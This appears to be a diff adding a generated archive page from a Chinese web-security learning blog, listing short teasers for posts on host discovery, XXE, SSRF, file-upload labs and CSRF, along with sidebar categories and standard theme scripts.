+    <a href="/categories/Web%E5%AE%89%E5%85%A8/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/">
+      主机发现
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/Web%E5%AE%89%E5%85%A8/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>Web安全</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 11, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>主机发现所用的工具</p>
+<p>参考：<a href="https://www.jianshu.com/p/b53d6d09246d" target="_blank" rel="noopener">https://www.jianshu.com/p/b53d6d09246d</a></p>
+      
+    </div>
+    
+      
+        <div class="button readmore">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/web%E5%AE%89%E5%85%A8/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+      xxe漏洞学习
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/web%E5%AE%89%E5%85%A8/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>web安全</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 5, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+      
+    </div>
+    
+      
+        <div class="button readmore">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/web%E5%AE%89%E5%85%A8/SSRF%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
+      SSRF漏洞笔记
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/web%E5%AE%89%E5%85%A8/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>web安全</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 3, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SSRF（server-site request forery，服务端请求伪造）是一种构造请求，由服务端发起请求的安全漏洞。</p>
+      
+    </div>
+    
+      
+        <div class="button readmore">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/SSRF%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
+      文件上传漏洞笔记
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/Web%E5%AE%89%E5%85%A8/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>Web安全</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 24, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>upload-libs通关笔记</p>
+      
+    </div>
+    
+      
+        <div class="button readmore">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/web%E5%AE%89%E5%85%A8/CSRF%E6%BC%8F%E6%B4%9E/">
+      CSRF漏洞
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/web%E5%AE%89%E5%85%A8/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>web安全</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 14, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CSRF（Cross-site request forery,跨站请求伪造）也被称为One Click Attack或者Session Riding ,通常缩写为CSRF或者XSRF</p>
+      
+    </div>
+    
+      
+        <div class="button readmore">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/CSRF%E6%BC%8F%E6%B4%9E/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+    
+  </section>
+  
+    
+      <br>
+      <div class="prev-next">
+        
+          <a class="prev" rel="prev" href="/">
+            <section class="post prev white-box shadow" >
+              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
+            </section>
+          </a>
+        
+        <p class="current">
+          2 / 4
+        </p>
+        
+          <a class="next" rel="next" href="/page/3/">
+            <section class="post next white-box shadow">
+              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
+            </section>
+          </a>
+        
+      </div>
+    
+    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
+    
+    
+
+  
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+<section class="widget blogger shadow desktop mobile">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box' href='/about/'>
+          <img no-lazy src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+        
+        
+          <p><span id="jinrishici-sentence">bansxf's blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="mailto:me@xaoxuu.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://github.com/xaoxuu"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://music.163.com/#/user/home?id=63035382"
+              class="social fas fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+  
+
+  <section class="widget category shadow desktop">
+    
+  <header>
+    
+      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <ul class="entry navigation">
+        
+          <li><a class="flat-box"
+            title="/categories/Kali-Linux/" href="/categories/Kali-Linux/"
+            id="categoriesKali-Linux"
+            ><div class='name'>Kali Linux</div><div class='badge'>(6)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Linux/" href="/categories/Linux/"
+            id="categoriesLinux"
+            ><div class='name'>Linux</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Web%E5%AE%89%E5%85%A8/" href="/categories/Web%E5%AE%89%E5%85%A8/"
+            id="categoriesWebE5AE89E585A8"
+            ><div class='name'>Web安全</div><div class='badge'>(3)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Windows/" href="/categories/Windows/"
+            id="categoriesWindows"
+            ><div class='name'>Windows</div><div class='badge'>(2)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/WriteUp/" href="/categories/WriteUp/"
+            id="categoriesWriteUp"
+            ><div class='name'>WriteUp</div><div class='badge'>(2)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/web%E5%AE%89%E5%85%A8/" href="/categories/web%E5%AE%89%E5%85%A8/"
+            id="categorieswebE5AE89E585A8"
+            ><div class='name'>web安全</div><div class='badge'>(5)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/" href="/categories/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"
+            id="categoriesE5AE9EE68898E99DB6E59CBA"
+            ><div class='name'>实战靶场</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E5%B7%A5%E5%85%B7/" href="/categories/%E5%B7%A5%E5%85%B7/"
+            id="categoriesE5B7A5E585B7"
+            ><div class='name'>工具</div><div class='badge'>(8)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"
+            id="categoriesE7BD91E7BB9CE58D8FE8AEAE"
+            ><div class='name'>网络协议</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E8%84%9A%E6%9C%AC/" href="/categories/%E8%84%9A%E6%9C%AC/"
+            id="categoriesE8849AE69CAC"
+            ><div class='name'>脚本</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/" href="/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/"
+            id="categoriesE88F9CE9B89FE4BA92E58AA9"
+            ><div class='name'>菜鸟互助</div><div class='badge'>(1)</div></a></li>
+        
+      </ul>
+    </div>
+  </section>
+
+
+  
+
+  
+    
+    
+  
+
+  <section class="widget tagcloud shadow desktop mobile">
+    
+  <header>
+    
+      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <a href="/tags/CSRF/" style="font-size: 14px; color: #999">CSRF</a> <a href="/tags/CTF/" style="font-size: 24px; color: #555">CTF</a> <a href="/tags/CTF-Web/" style="font-size: 24px; color: #555">CTF-Web</a> <a href="/tags/Vim/" style="font-size: 14px; color: #999">Vim</a> <a href="/tags/arp/" style="font-size: 14px; color: #999">arp</a> <a href="/tags/python/" style="font-size: 14px; color: #999">python</a> <a href="/tags/python%E8%84%9A%E6%9C%AC/" style="font-size: 14px; color: #999">python脚本</a> <a href="/tags/sql/" style="font-size: 14px; color: #999">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/ssh/" style="font-size: 14px; color: #999">ssh</a> <a href="/tags/xss/" style="font-size: 14px; color: #999">xss</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 14px; color: #999">博客搭建</a> <a href="/tags/%E6%B1%87%E7%BC%96/" style="font-size: 14px; color: #999">汇编</a>
+    </div>
+  </section>
+
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+  
+    <meting-js
+      theme='#1BCDFC'
+      autoplay='false'
+      volume='0.7'
+      loop='all'
+      order='list'
+      fixed='false'
+      list-max-height='340px'
+      server='netease'
+      type='playlist'
+      id='3175833810'
+      list-folded='true'>
+    </meting-js>
+  
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:me@xaoxuu.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/xaoxuu"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://music.163.com/#/user/home?id=63035382"
+                class="social fas fa-headphones-alt flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        Use
+        <a href="https://volantis.js.org/" target="_blank" class="codename">Volantis</a>
+        as theme, total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="https://xaoxuu.com" target="_blank" rel="noopener">Copyright © 2017-2020 Mr. X</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script aysc src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js" aysc></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js" aysc></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js" aysc></script>
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js" aysc></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js" defer></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js" aysc></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script aysc src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+<script aysc src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 标准 markdown 描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
